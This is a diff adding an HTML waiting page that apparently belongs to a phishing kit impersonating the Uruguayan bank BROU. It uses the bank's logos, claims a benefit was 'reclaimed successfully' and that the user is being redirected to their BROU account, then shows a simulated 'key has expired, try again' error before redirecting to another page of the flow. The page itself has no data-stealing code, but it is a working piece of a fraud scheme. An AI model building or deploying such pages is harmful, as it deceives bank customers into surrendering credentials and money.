@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facturando...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #08528d;
+      font-family: 'Segoe UI', sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      text-align: center;
+      color: white;
+    }
+
+    header {
+      padding: 20px;
+    }
+
+    header img {
+      height: 36px;
+    }
+
+    main {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 22px;
+      user-select: none;
+    }
+
+    footer {
+      padding: 10px 0 20px;
+    }
+
+    footer img {
+      height: 28px;
+    }
+
+    .spinner-blue {
+      border: 6px solid #d6d6d6;
+      border-top: 6px solid #ffc400;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px 0;
+    }
+
+    .spinner-white {
+      border: 6px solid #d6d6d6;
+      border-top: 6px solid white;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 10px auto 0 auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    #mensaje-exito {
+      display: none;
+    }
+
+    #subtitulo {
+      font-weight: normal;
+      font-size: 16px;
+      margin-top: 6px;
+      color: #e0e0e0;
+    }
+
+    #error-message {
+      display: none;
+      background-color: #f44336; /* Rojo */
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo.svg" alt="BROU Logo" />
+  </header>
+
+  <main>
+    <div id="texto-cargando">Verificando datos...</div>
+    <div class="spinner-blue" id="ruedita-cargando"></div>
+
+    <div id="mensaje-exito">
+      Beneficio reclamado con éxito!
+      <div id="subtitulo">Redireccionando a tu cuenta BROU...</div>
+      <div class="spinner-white"></div>
+    </div>
+
+    <!-- Aquí se muestra el mensaje de error -->
+    <div id="error-message">
+      La llave ha caducado, por favor intenta nuevamente.
+    </div>
+  </main>
+
+  <footer>
+    <img src="logofooter.svg" alt="BROU Footer Logo" />
+  </footer>
+
+  <script>
+    const textoCargando = document.getElementById('texto-cargando');
+    const rueditaCargando = document.getElementById('ruedita-cargando');
+    const mensajeExito = document.getElementById('mensaje-exito');
+    const errorMessage = document.getElementById('error-message');
+
+    // Mostrar mensaje de error (simulando que la llave ha caducado)
+    setTimeout(() => {
+      textoCargando.style.display = 'none';
+      rueditaCargando.style.display = 'none';
+      mensajeExito.style.display = 'none';
+      errorMessage.style.display = 'block';
+
+      // El mensaje de error desaparece después de 3 segundos
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 3000);
+    }, 3000); // Se muestra el error después de 3 segundos de cargar
+
+    // Redirección después de 7 segundos
+    setTimeout(() => {
+      window.location.href = 'cargando.html';
+    }, 2000);
+  </script>
+</body>
+
+</html>
